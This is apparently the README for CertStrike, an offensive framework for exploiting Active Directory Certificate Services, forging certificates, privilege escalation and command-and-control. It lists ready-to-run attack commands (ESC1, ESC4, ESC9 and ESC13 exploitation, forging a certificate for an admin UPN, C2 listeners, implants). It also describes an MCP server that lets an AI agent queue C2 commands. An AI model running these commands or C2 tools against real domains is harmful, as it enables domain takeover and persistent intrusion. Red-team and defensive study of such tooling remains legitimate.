# CertStrike

## Overview
CertStrike is an ADCS exploitation and PKI attack framework with integrated cert-auth C2. Pure Go, CGO-free.

## Architecture
- `cmd/certstrike/` — CLI entry points (cobra commands)
- `pkg/pki/` — ADCS enumeration, ESC1-ESC13 exploitation, certificate forging
- `pkg/c2/` — HTTP/HTTPS C2 listener with session management, cert-auth implants, polling agent
- `internal/mcp/` — MCP stdio server (5 tools)
- `internal/tui/` — Bubbletea operator console
- `implants/smartpotato/` — Windows potato privilege escalation (JuicyPotato, RoguePotato, SweetPotato)

## Build
```bash
CGO_ENABLED=0 go build ./...
# SmartPotato (Windows cross-compile):
cd implants/smartpotato && GOOS=windows GOARCH=amd64 go build -o smartpotato.exe
```

## Features

### PKI / ADCS
- **Native LDAP enumeration** — connects to DC LDAP port 389/636, no ldapsearch binary needed
- **ESC1-ESC5 vulnerability scoring** — automatic detection with full ACE parsing for ESC4
- **ESC8/ESC11 detection** — CA-level HTTP web enrollment and RPC relay vulnerability scanning
- **ESC9 detection + exploitation** — CT_FLAG_NO_SECURITY_EXTENSION with UPN swap attack
- **ESC13 detection + exploitation** — OID group link abuse via msDS-OIDToGroupLink
- **ESC1/ESC4 exploitation** — forge certs, modify template ACLs, auto-restore
- **Attack chain auto-detection** — enumerate, score, generate prioritized attack paths
- **Golden certificate forging** — ECDSA certificates with UPN SAN for PKINIT

### C2 Framework
- HTTP/HTTPS listeners with auto-generated TLS certificates
- Session management (register, poll, command queue, result collection)
- **Certificate persistence** — cert-auth implants using forged certificates (Schannel mTLS)
- **Polling agent** — `certstrike agent --config stager.json`

### MCP Server
Tools: `pki_enumerate`, `pki_forge`, `c2_list_sessions`, `c2_queue_command`, `c2_get_results`

### Operator Console (TUI)
Bubbletea-based console with views: Sessions, Commands, Listeners, Implants.

## Key Commands
```bash
certstrike pki --enum --target-dc dc01.corp.local --domain corp.local
certstrike pki --forge --upn admin@corp.local
certstrike pki --exploit esc1 --template VulnTemplate --upn admin@domain.com
certstrike pki --exploit esc4 --template WritableTemplate --upn admin@domain.com
certstrike pki --exploit esc9 --template NoSecExt --upn target@domain.com --attacker-dn "CN=attacker,..."
certstrike pki --exploit esc13 --template LinkedPolicy --upn admin@domain.com
certstrike pki --auto-detect --target-dc dc01.corp.local --domain corp.local
certstrike c2 --port 8443 --protocol https
certstrike agent --config stager.json
certstrike console
certstrike mcp
```

## Dependencies
- github.com/spf13/cobra — CLI framework
- github.com/go-ldap/ldap/v3 — Native LDAP client (pure Go, no CGO)
- github.com/charmbracelet/bubbletea — TUI framework
- github.com/charmbracelet/lipgloss — TUI styling
- github.com/charmbracelet/bubbles — TUI components
